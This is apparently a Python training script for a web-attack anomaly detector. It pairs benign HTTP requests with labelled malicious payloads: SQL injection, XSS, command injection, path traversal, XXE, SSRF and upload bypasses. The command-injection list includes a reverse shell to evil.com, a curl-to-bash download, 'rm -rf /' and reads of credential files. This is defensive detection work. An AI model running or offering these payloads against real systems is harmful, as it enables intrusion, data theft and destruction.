"""
Sentinel ML Engine v2.0 - Model Training Script
Trains Isolation Forest on sample attack/benign data
"""

from model import MLAnomalyDetector
import config


def generate_training_data():
    """
    Generate training dataset
    Mix of benign and malicious payloads
    
    Returns:
        tuple: (payloads, labels) where labels are 1=malicious, 0=benign
    """
    
    # Benign payloads (normal web traffic)
    benign = [
        # Normal GET requests
        "GET /index.html HTTP/1.1",
        "GET /about.html HTTP/1.1",
        "GET /contact.html HTTP/1.1",
        "GET /products.html HTTP/1.1",
        "GET /blog/2024/article.html HTTP/1.1",
        "GET /images/logo.png HTTP/1.1",
        "GET /css/style.css HTTP/1.1",
        "GET /js/script.js HTTP/1.1",
        "GET /favicon.ico HTTP/1.1",
        "GET /sitemap.xml HTTP/1.1",
        
        # Normal POST requests
        "POST /api/login username=john&password=secret123",
        "POST /api/register email=user@example.com&name=John",
        "POST /api/search query=machine learning tutorials",
        "POST /api/comment content=Great article, thanks!",
        "POST /api/subscribe email=user@example.com",
        
        # Normal API calls
        "GET /api/users/123",
        "GET /api/products?category=electronics",
        "GET /api/posts?page=1&limit=10",
        "POST /api/orders {product_id: 456, quantity: 2}",
        "PUT /api/profile {name: 'John Doe', bio: 'Developer'}",
        
        # Normal searches
        "search?q=python programming",
        "search?q=best restaurants near me",
        "search?q=weather forecast",
        "filter?category=books&price_min=10&price_max=50",
        
        # More benign variations
        "GET /docs/tutorial.pdf HTTP/1.1",
        "GET /downloads/software.zip HTTP/1.1",
        "POST /feedback message=The site is great!",
        "GET /api/news?date=2024-01-15",
        "GET /profile/user123",
        "POST /api/upload filename=document.pdf",
    ]
    
    # Malicious payloads - SQL Injection
    sql_injection = [
        "admin' OR '1'='1'--",
        "' OR 1=1--",
        "admin'--",
        "' OR 'a'='a",
        "1' AND 1=1--",
        "' UNION SELECT NULL--",
        "' UNION SELECT password FROM users--",
        "' UNION SELECT username, password FROM admin--",
        "'; DROP TABLE users--",
        "admin' OR '1'='1'/*",
        "1' AND 'a'='a",
        "' OR ''='",
        "' UNION SELECT @@version--",
        "' UNION SELECT database()--",
        "1' ORDER BY 10--",
        "' UNION ALL SELECT NULL, NULL, NULL--",
        "admin' OR 1=1 LIMIT 1--",
        "' AND 1=0 UNION SELECT NULL, NULL--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "admin') OR ('1'='1'--",
    ]
    
    # Malicious payloads - XSS (Cross-Site Scripting)
    xss_attacks = [
        "<script>alert('XSS')</script>",
        "<script>document.cookie</script>",
        "<img src=x onerror=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<script>window.location='http://evil.com'</script>",
        "'-alert(1)-'",
        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ]
    
    # Malicious payloads - Command Injection
    command_injection = [
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "; ls -la /root",
        "| whoami",
        "&& id",
        "; wget http://evil.com/malware.sh",
        "| curl http://evil.com/malware | bash",
        "; rm -rf /",
        "&& nc -e /bin/bash evil.com 4444",
        "`cat /etc/shadow`",
        "$(whoami)",
        "; ps aux | grep root",
        "| find / -name '*.key'",
        "&& chmod +x /tmp/backdoor.sh",
    ]
    
    # Malicious payloads - Path Traversal
    path_traversal = [
        "../../../../etc/passwd",
        "../../../etc/shadow",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "../../../../../../etc/passwd%00.jpg",
        "../../../../../../../windows/win.ini",
        "....//....//....//windows/system32/drivers/etc/hosts",
    ]
    
    # Malicious payloads - Other attacks
    other_attacks = [
        # LDAP Injection
        "*)(uid=*))(|(uid=*",
        "admin*",
        "*)(&(objectClass=*",
        
        # XML Injection
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
        
        # Template Injection
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        
        # SSRF
        "http://localhost:8080/admin",
        "http://169.254.169.254/latest/meta-data/",
        
        # File Upload bypass
        "shell.php%00.jpg",
        "backdoor.php.jpg",
    ]
    
    # Malicious payloads - Obfuscated/Evasion
    obfuscated = [
        # URL encoded
        "%27%20OR%20%271%27%3D%271",  # ' OR '1'='1
        "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",  # <script>alert(1)</script>
        
        # Double encoded
        "%2527%2520OR%2520%25271%2527%253D%25271",
        
        # Comment injection (SQL)
        "ad'/**/OR/**/1=1--",
        "SEL/**/ECT * FROM users",
        
        # Case variation
        "SeLeCt * FrOm users",
        "<ScRiPt>alert(1)</sCrIpT>",
        
        # Null byte injection
        "/etc/passwd%00.jpg",
        "file.php%00.txt",
    ]
    
    # Combine all malicious payloads
    malicious = (
        sql_injection + 
        xss_attacks + 
        command_injection + 
        path_traversal + 
        other_attacks + 
        obfuscated
    )
    
    # Create labels (0 = benign, 1 = malicious)
    payloads = benign + malicious
    labels = [0] * len(benign) + [1] * len(malicious)
    
    return payloads, labels


def main():
    """Train the model"""
    print("="*80)
    print("SENTINEL ML ENGINE v2.0 - MODEL TRAINING")
    print("="*80)
    
    # Generate training data
    print("\n[INFO] Generating training data...")
    payloads, labels = generate_training_data()
    
    print(f"[INFO] Dataset size: {len(payloads)} samples")
    print(f"  Benign:    {labels.count(0)} samples")
    print(f"  Malicious: {labels.count(1)} samples")
    print(f"  Ratio:     {labels.count(1)/len(labels):.1%} malicious")
    
    # Create detector
    detector = MLAnomalyDetector()
    
    # Train
    print("\n" + "="*80)
    stats = detector.train(payloads, labels=labels)
    print("="*80)
    
    # Save model
    print("\n[INFO] Saving model...")
    detector.save_model()
    
    print("\n[SUCCESS] Training complete!")
    print("\nYou can now run:")
    print("  python main.py --mode test")
    print("  python main.py --mode interactive")


if __name__ == "__main__":
    main()
